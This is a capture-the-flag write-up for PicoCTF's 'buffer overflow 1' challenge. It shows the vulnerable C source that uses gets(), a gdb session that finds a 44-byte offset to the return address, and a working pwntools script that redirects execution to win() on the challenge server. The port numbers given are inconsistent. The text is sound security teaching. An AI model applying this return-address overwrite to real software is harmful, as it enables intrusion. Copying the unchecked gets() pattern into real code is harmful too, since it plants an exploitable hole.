# PicoCTF - buffer overflow 1

## Challenge Overview
**Title:** buffer overflow 1  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using nc saturn.picoctf.net 63899

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Analysis
This challenge depicts a classic exploit of the buffer overflow vulnerability.  

### Background Knowledge
Each function allocates itself some space in the stack in which it stores values it needs.  

**x86 Stack Frame Layout**
High Addresses  Local Variables
                Previous EBP
                Return Address
Low Addresses   Arguments

This means, that a buffer overflow in a local variable can overwrite the return address and control where the function will return to.
```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);
```
`vuln()` contains a local buffer of size 32 and uses `gets()` which doesn't protect against buffer overflow.  

So we can overwrite the return address and make return to the return function.

To construct the payload I will use `gdb` to inspect the stack and calculate the length of our input needed to overwrite the return address.  
I set a breakpoint after the `gets` cll in `vuln`
```
b *0x080492a3
```
I launch the program and enter `AAAAAAA` as my input and inspect the stack
```
(gdb) r
Starting program: /home/giorgos/Downloads/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
AAAAAAA

Breakpoint 1, 0x080492a3 in vuln ()
(gdb) x/32x $ebp-64
0xffffcd88:	0xffffcdc8	0x080492a3	0xffffcda0	0x0804c000
0xffffcd98:	0xf7f9de34	0x08049291	0x41414141	0x00414141
0xffffcda8:	0x00000000	0x0804c000	0x08049350	0xf7ffcb60
0xffffcdb8:	0xffffcde8	0x08049327	0x0804a0a0	0x0804c000
0xffffcdc8:	0xffffcde8	0x0804932f	0xffffffff	0xf7d7e96c
```
We see where our input starts and where the return address (0x0804932f) is and find how many bytes are needed to reach it
Input start:    0xffffcda0
Return address: 0xffffcdcc
Bytes: 0x2C or 44 in decimal

So we need 44 As to reach the return address and then we can append the address we want

To create the payload I will use the following Python script
### Python Script - Payload Generation
```python
from pwn import *


def construct_payload(addr):

    chunks = [addr[i:i+2] for i in range(0, len(addr), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]

    payload = 'A'*44
    payload += ''.join(hex_bytes)
    return payload


def main():
    win_addr = "080491f6"
    payload = construct_payload(win_addr)
    print(payload)

main()
```
This creates the following payload
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08
```
The `\xf6\x91\x04\x08` is the format `printf` will need to convert this bytes to the respective characters since they might not be printable

Back in gdb, in order to pipe the result of we can use
```
r < <(printf "$(python generate_payload.py)")
```

And we see that we are successful
```
Continuing.
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
```

Now all we need to do is provide the our payload to the server.  
We can do so using `pwntools` in Python
```python
from pwn import *


def construct_payload(addr):

    chunks = [addr[i:i+2] for i in range(0, len(addr), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]

    payload = 'A'*44
    payload += ''.join(hex_bytes)
    return payload.encode().decode('unicode_escape').encode('latin1')


def send_to_server(payload):
    # Connect to the remote server
    host = 'saturn.picoctf.net'
    port = 50253
    conn = remote(host, port)

    print(conn.recv())
    conn.sendline(payload)

    # Receive the server's response
    response = conn.recvall()
    # Close the connection
    conn.close()
    
    return response


def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def main():
    win_addr = "080491f6"
    payload = construct_payload(win_addr)
    server_output = send_to_server(payload)
    print(get_flag(server_output.decode('utf-8', errors='ignore')))


main()
```
```
$ python script.py          
[+] Opening connection to saturn.picoctf.net on port 53110: Done
b'Please enter your string: \n'
[+] Receiving all data: Done (100B)
[*] Closed connection to saturn.picoctf.net port 53110
picoCTF{____REDACTED____}
```
This generates the payload, sends it to the server and prints the flag

## Solution
- Find distance of `buf` in `vuln()` from the return address
- Override return address with the address of `win()`

## Tools Used
- `gdb`